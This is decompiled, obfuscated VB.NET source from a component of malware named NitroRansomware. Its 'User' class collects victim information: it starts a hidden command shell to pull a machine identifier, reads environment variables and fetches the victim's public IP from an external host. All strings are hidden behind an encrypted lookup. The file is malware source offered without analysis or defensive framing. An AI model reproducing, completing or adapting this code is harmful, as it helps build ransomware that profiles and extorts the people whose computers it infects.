Imports System
Imports System.Collections.Generic
Imports System.Diagnostics
Imports System.IO
Imports System.Net.Http
Imports System.Threading
Imports System.Threading.Tasks
Imports dg3ypDAonQcOidMs0w
Imports rE4lpnT863QnijKQK5

Namespace NitroRansomware
	' Token: 0x02000009 RID: 9
	Friend Class User
		' Token: 0x06000036 RID: 54 RVA: 0x00004D44 File Offset: 0x00002F44
		Public Shared Function GetIdentifier() As String
			Dim text As String = String.Empty
			Try
				Using cmd As User.Cmd = New User.Cmd(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5246))
					Dim text2 As String = cmd.ExecuteCommand(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5264))
					text = text2.Split(New Char() { vbLf })(6)
				End Using
			Catch ex As Exception
				User.logging.[Error](ex.Message)
			End Try
			Return text
		End Function

		' Token: 0x06000037 RID: 55 RVA: 0x00004DD0 File Offset: 0x00002FD0
		Public Shared Function GetDetails() As List(Of String)
			Dim list As List(Of String) = New List(Of String)()
			Dim environmentVariable As String = Environment.GetEnvironmentVariable(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5314))
			Dim environmentVariable2 As String = Environment.GetEnvironmentVariable(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5342))
			list.Add(environmentVariable)
			list.Add(environmentVariable2)
			Return list
		End Function

		' Token: 0x06000038 RID: 56 RVA: 0x00004E14 File Offset: 0x00003014
		Public Shared Function GetIP() As String
			Dim text As String = String.Empty
			Try
				Using httpClient As HttpClient = New HttpClient()
					Dim async As Task(Of HttpResponseMessage) = httpClient.GetAsync(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5362))
					Dim task As Task(Of String) = async.Result.Content.ReadAsStringAsync()
					text = task.Result
				End Using
			Catch ex As Exception
				User.logging.[Error](ex.Message)
			End Try
			Return text
		End Function

		' Token: 0x06000039 RID: 57 RVA: 0x00002243 File Offset: 0x00000443
		Public Sub New()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			MyBase..ctor()
		End Sub

		' Token: 0x0600003A RID: 58 RVA: 0x00002397 File Offset: 0x00000597
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			User.logging = New Logs(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(234), 0)
		End Sub

		' Token: 0x04000035 RID: 53
		Private Shared logging As Logs

		' Token: 0x0200000A RID: 10
		Private Class Cmd
			Implements IDisposable

			' Token: 0x0600003B RID: 59 RVA: 0x00004E9C File Offset: 0x0000309C
			Public Sub New(cmdPath As String)
				hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
				MyBase..ctor()
				Me.cmdProcess = New Process()
				Me.outputWaitHandle = New AutoResetEvent(False)
				Me.cmdOutput = String.Empty
				Dim processStartInfo As ProcessStartInfo = New ProcessStartInfo()
				processStartInfo.FileName = cmdPath
				processStartInfo.UseShellExecute = False
				processStartInfo.RedirectStandardOutput = True
				processStartInfo.RedirectStandardInput = True
				processStartInfo.CreateNoWindow = True
				AddHandler Me.cmdProcess.OutputDataReceived, AddressOf Me.CmdProcess_OutputDataReceived
				Me.cmdProcess.StartInfo = processStartInfo
				Me.cmdProcess.Start()
				Me.sw = Me.cmdProcess.StandardInput
				Me.cmdProcess.BeginOutputReadLine()
			End Sub

			' Token: 0x0600003C RID: 60 RVA: 0x000023B8 File Offset: 0x000005B8
			Public Sub Dispose() Implements System.IDisposable.Dispose
				Me.cmdProcess.Close()
				Me.cmdProcess.Dispose()
				Me.sw.Close()
				Me.sw.Dispose()
			End Sub

			' Token: 0x0600003D RID: 61 RVA: 0x00004F4C File Offset: 0x0000314C
			Public Function ExecuteCommand(command As String) As String
				Me.cmdOutput = String.Empty
				Me.sw.WriteLine(command)
				Me.sw.WriteLine(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5608))
				Me.outputWaitHandle.WaitOne()
				Return Me.cmdOutput
			End Function

			' Token: 0x0600003E RID: 62 RVA: 0x00004F9C File Offset: 0x0000319C
			Private Sub CmdProcess_OutputDataReceived(sender As Object, e As DataReceivedEventArgs)
				If e.Data Is Nothing OrElse e.Data = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(5628) Then
					Me.outputWaitHandle.[Set]()
				Else
					Me.cmdOutput = Me.cmdOutput + e.Data + Environment.NewLine
				End If
			End Sub

			' Token: 0x0600003F RID: 63 RVA: 0x0000223C File Offset: 0x0000043C
			' Note: this type is marked as 'beforefieldinit'.
			Shared Sub New()
				WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
			End Sub

			' Token: 0x04000036 RID: 54
			Private cmdProcess As Process

			' Token: 0x04000037 RID: 55
			Private sw As StreamWriter

			' Token: 0x04000038 RID: 56
			Private outputWaitHandle As AutoResetEvent

			' Token: 0x04000039 RID: 57
			Private cmdOutput As String
		End Class
	End Class
End Namespace
